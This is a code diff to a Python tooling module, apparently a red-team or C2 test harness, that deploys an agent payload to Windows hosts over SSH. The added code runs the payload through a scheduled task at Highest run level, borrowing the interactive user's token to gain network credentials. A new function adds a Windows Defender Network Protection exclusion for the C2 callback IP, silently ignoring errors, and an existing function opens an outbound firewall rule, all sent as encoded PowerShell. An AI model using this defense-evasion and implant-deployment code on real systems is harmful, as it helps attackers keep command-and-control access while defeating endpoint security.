@@ -483,22 +483,25 @@ def _windows_wmi_create_script(command_line: str) -> str:
 
 
 def _windows_schtask_script(exe_path: str, arguments: str = "") -> str:
-    """Build PowerShell that uses Task Scheduler (S4U) to run *exe_path* as the current user.
+    """Build PowerShell that uses Task Scheduler to run *exe_path* as the current user.
 
     Unlike ``WMI Win32_Process.Create`` (which runs as SYSTEM), this approach
-    launches the process under the SSH session user's identity, which prevents
-    Windows Defender Network Protection from blocking outbound TCP connections
-    from untrusted SYSTEM-context processes (H1), and avoids WinHTTP session
-    isolation that occurs in the SYSTEM-only session stack (H3).
+    launches the process under the SSH session user's identity.  The task survives
+    SSH session close because Task Scheduler is independent of the SSH job object.
+    The task registration is removed after launch; the child process keeps running.
 
-    The task survives SSH session close because Task Scheduler is independent
-    of the SSH job object (unlike ``Start-Process``, which is killed when
-    OpenSSH tears down the session).  The task registration is removed after
-    launch; the child process keeps running as an independent process.
+    **LogonType strategy**: tries ``Interactive`` first so the task inherits the
+    user's existing interactive-session token, which carries full network credentials.
+    S4U tokens (the original approach) lack network credentials, causing WinHTTP to
+    make no outbound TCP connections even when raw TCP is reachable from PowerShell
+    (scenario 17 symptom: process alive, netstat shows zero rows for the C2 port).
 
-    ``-WorkingDirectory`` is set to the executable's parent folder (same idea
-    as the WMI *CurrentDirectory* argument) so payloads do not inherit an
-    unexpected CWD such as ``System32``.
+    Falls back to ``S4U`` if Interactive registration fails (no interactive session
+    available on headless VMs) or if the task stays in ``Queued`` state after 2 s
+    (scheduler found no interactive session to bind the task to).
+
+    ``-WorkingDirectory`` is set to the executable's parent folder so payloads do
+    not inherit an unexpected CWD such as ``System32``.
 
     Args:
         exe_path:  Path to the executable (no arguments).
@@ -518,13 +521,40 @@ def _windows_schtask_script(exe_path: str, arguments: str = "") -> str:
         "$settings = New-ScheduledTaskSettingsSet "
         "-ExecutionTimeLimit ([TimeSpan]::Zero) -StartWhenAvailable; "
         "$me = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name; "
-        "$principal = New-ScheduledTaskPrincipal -UserId $me "
-        "-LogonType S4U -RunLevel Highest; "
-        "Register-ScheduledTask -TaskName $name -Action $action "
-        "-Settings $settings -Principal $principal -Force -ErrorAction Stop | Out-Null; "
+        # Try Interactive first (preserves network credentials); fall back to S4U.
+        "$usedLogonType = 'S4U'; "
+        "try { "
+        "  $principal = New-ScheduledTaskPrincipal -UserId $me "
+        "    -LogonType Interactive -RunLevel Highest -ErrorAction Stop; "
+        "  Register-ScheduledTask -TaskName $name -Action $action "
+        "    -Settings $settings -Principal $principal -Force -ErrorAction Stop | Out-Null; "
+        "  $usedLogonType = 'Interactive'; "
+        "  Write-Output 'RCTEST_SCHTASK_LOGONTYPE:Interactive(attempt)'; "
+        "} catch { "
+        "  $usedLogonType = 'S4U'; "
+        "  Write-Output ('RCTEST_SCHTASK_LOGONTYPE_WARN:Interactive failed: ' + $_.Exception.Message.Split([Environment]::NewLine)[0]); "
+        "  $principal = New-ScheduledTaskPrincipal -UserId $me -LogonType S4U -RunLevel Highest; "
+        "  Register-ScheduledTask -TaskName $name -Action $action "
+        "    -Settings $settings -Principal $principal -Force -ErrorAction Stop | Out-Null; "
+        "  Write-Output 'RCTEST_SCHTASK_LOGONTYPE:S4U'; "
+        "} "
         "Start-ScheduledTask -TaskName $name -ErrorAction Stop; "
-        "Start-Sleep -Milliseconds 1500; "
+        # Wait 2 s for the state to settle; Interactive tasks stay Queued when no
+        # interactive session exists, which is the cue to re-register with S4U.
+        "Start-Sleep -Milliseconds 2000; "
         "$task = Get-ScheduledTask -TaskName $name -ErrorAction Stop; "
+        "if ($usedLogonType -eq 'Interactive' -and $task.State -eq 'Queued') { "
+        "  Write-Output 'RCTEST_SCHTASK_LOGONTYPE_WARN:Interactive Queued (no session) — retrying as S4U'; "
+        "  Unregister-ScheduledTask -TaskName $name -Confirm:$false -ErrorAction SilentlyContinue; "
+        "  $principal = New-ScheduledTaskPrincipal -UserId $me -LogonType S4U -RunLevel Highest; "
+        "  Register-ScheduledTask -TaskName $name -Action $action "
+        "    -Settings $settings -Principal $principal -Force -ErrorAction Stop | Out-Null; "
+        "  Write-Output 'RCTEST_SCHTASK_LOGONTYPE:S4U(queued-fallback)'; "
+        "  $usedLogonType = 'S4U'; "
+        "  Start-ScheduledTask -TaskName $name -ErrorAction Stop; "
+        "  Start-Sleep -Milliseconds 1500; "
+        "  $task = Get-ScheduledTask -TaskName $name -ErrorAction Stop; "
+        "} "
         "$ti = Get-ScheduledTaskInfo -TaskName $name -ErrorAction Stop; "
         "$st = $task.State; "
         "Write-Output ('RCTEST_SCHTASK_NAME:' + $name); "
@@ -533,8 +563,9 @@ def _windows_schtask_script(exe_path: str, arguments: str = "") -> str:
         "Write-Output ('RCTEST_SCHTASK_STATE:' + $st); "
         "Write-Output ('RCTEST_SCHTASK_LASTTASKRESULT:' + $ti.LastTaskResult); "
         "Write-Output ('RCTEST_SCHTASK_LASTRUNTIME:' + $ti.LastRunTime.ToString('o')); "
+        # Process probe: S4U processes have NULL ExecutablePath in WMI; search by name too.
         "$procs = Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | "
-        "Where-Object { $_.ExecutablePath -eq $exePath }; "
+        "Where-Object { $_.ExecutablePath -eq $exePath -or ($_.ExecutablePath -eq $null -and $_.Name -eq $exeLeaf) }; "
         "if ($procs) { "
         "  foreach ($p in $procs) { "
         "    $owner = Invoke-CimMethod -InputObject $p -MethodName GetOwner -ErrorAction SilentlyContinue; "
@@ -597,6 +628,40 @@ def firewall_allow_program(target: TargetConfig, program_path: str) -> None:
         f"Remove-NetFirewallRule -DisplayName {name_q} -ErrorAction SilentlyContinue; "
         f"New-NetFirewallRule -DisplayName {name_q} -Direction Outbound -Action Allow "
         f"-Program {prog_q} -ErrorAction SilentlyContinue; "
+        "exit 0"
+    )
+    enc = _powershell_encoded_command(script)
+    run_remote(target, f"powershell -NoProfile -EncodedCommand {enc}")
+
+
+def defender_network_protection_exclusion(target: TargetConfig, ip_address: str) -> None:
+    """Add a Defender Network Protection IP exclusion for *ip_address* (Windows only).
+
+    Windows Defender Network Protection (SmartScreen network enforcement) can
+    silently drop WinHTTP outbound connections from untrusted executables running
+    under S4U Task Scheduler sessions, even when raw TCP to the same host succeeds
+    from PowerShell.  The symptom is: agent alive, netstat shows zero rows for the
+    C2 port (no SYN generated — WinHTTP gets an immediate internal block error).
+
+    ``Add-MpPreference -ExclusionIpAddress`` tells Network Protection to allow
+    connections to/from the specified IP, bypassing reputation-based blocking.
+    Errors are silently swallowed (Defender may be absent or already disabled).
+
+    Args:
+        target:     Windows SSH target.  Raises ``ValueError`` for Linux targets.
+        ip_address: C2 callback host IP to exclude from network inspection.
+
+    Raises:
+        ValueError: when *target* is not a Windows target.
+        DeployError: when the SSH connection itself fails.
+    """
+    if target.platform != "windows":
+        raise ValueError(
+            "defender_network_protection_exclusion is only supported on Windows targets"
+        )
+    ip_q = _quote_powershell(ip_address.strip())
+    script = (
+        f"Add-MpPreference -ExclusionIpAddress {ip_q} -ErrorAction SilentlyContinue; "
         "exit 0"
     )
     enc = _powershell_encoded_command(script)
